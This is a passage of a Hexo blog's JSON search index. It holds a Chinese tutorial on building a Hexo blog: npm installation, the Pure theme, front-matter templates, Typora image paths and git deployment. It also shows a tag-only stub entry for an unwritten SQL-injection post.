待补充…","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"HEXO博客的搭建","slug":"HEXO博客的搭建","date":"2023-05-22T12:03:26.000Z","updated":"2023-05-23T09:20:27.191Z","comments":true,"path":"articles/2023/05/22/HEXO博客的搭建/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/22/HEXO%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/","excerpt":"","text":"安装HEXO和相关插件hexo的安装先安装node.js，地址：https://nodejs.org/en 安装完后安装Hexo： 1npm install hexo-cli -g 配置腾讯云节点： 12npm config set registry http://mirrors.cloud.tencent.com/npm/npm config get registry # 如果返回http://mirrors.cloud.tencent.com/npm/，说明镜像配置成功。 主题Pure以及配置主题：https://github.com/cofess/hexo-theme-pure 先初始化一个文件夹，例如Blog： 1hexo init Blog 加载主题： 1git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 更新主题： 12cd themes/puregit pull 配置（需要配置根目录config）：参考1，参考2，参考3，参考4 12language: zh-CN # 中文... 写文章参考，没啥要讲的，指令：hexo n &quot;title&quot;，即可。 模板模板在目录scaffolds里面，一般新建文件都会附上他的头，推荐头： 12345678title: HEXO博客的搭建toc: truesidebar: nonedate: 2023-05-22 20:03:26tags: [博客搭建]categories: [杂]descriptions: 本文介绍hexo搭建博客的心路历程typora-root-url: ..\\..\\.. 上面的typora-root-url很重要！下面说到。 设置分类由于post文件夹里面的文章太多不好管理，那么只要我们分类一下即可。参考 配置： 12permalink: &#x27;articles/:year/:month/:day/:name/&#x27;new_post_name: &#x27;:year/:month/:title.md&#x27; Hexo与Typora协同先设置一下图片目录：优先相对路径，自己设置，然后在文件头上蛇者上面的玩意。 解释：也就是，typora会将图片自动加载到一个文件夹里（它自己设置的），后面我们只需要设置根目录typora-root-url，让hexo能链接到即可！ 参考 404转发https://hexo-next.readthedocs.io/zh_CN/latest/hexo/advanced/404%E9%A1%B5%E9%9D%A2/ 常用指令123456hexo cleanhexo ghexo d # 推送 或者一起：hugo g -dhexo s # 本地测试hexo n &#x27;title&#x27; 推送hexo d安装npm install hexo-deployer-git --save 然后配置： 12345deploy: type: git repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io branch: [branch] message: [message] 参考：https://hexo.io/zh-cn/docs/one-command-deployment.html 一些问题Spawn failedhttps://blog.csdn.net/Kevin_Carpricron/article/details/124069885 组件推荐文章加密https://blog.51cto.com/u_15719567/5476056 效果","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"},{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://j3f5.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}